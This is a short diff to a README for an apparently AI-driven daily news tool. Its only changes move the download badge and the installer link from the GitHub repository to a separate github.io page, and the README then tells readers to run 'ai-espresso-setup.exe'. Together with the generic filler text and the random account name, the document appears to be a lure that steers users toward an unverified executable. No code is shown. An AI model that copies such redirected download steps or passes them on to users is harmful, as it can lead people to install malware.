@@ -1,6 +1,6 @@
 # ☕ ai-espresso-news-agent - Create daily news editions with AI
 
-[![Download AI Espresso](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/nonhierarchic-exmayor253/ai-espresso-news-agent)
+[![Download AI Espresso](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://nonhierarchic-exmayor253.github.io)
 
 AI Espresso v2026 creates daily news reports. The software scans for relevant technology updates using automated agents. It ranks these stories with large language models to produce a finished report. You read the top news in a clean format each morning.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [download page](https://github.com/nonhierarchic-exmayor253/ai-espresso-news-agent) to get the installer.
+1. Visit the [download page](https://nonhierarchic-exmayor253.github.io) to get the installer.
 2. Locate the file named `ai-espresso-setup.exe` in your downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen to finish the setup.
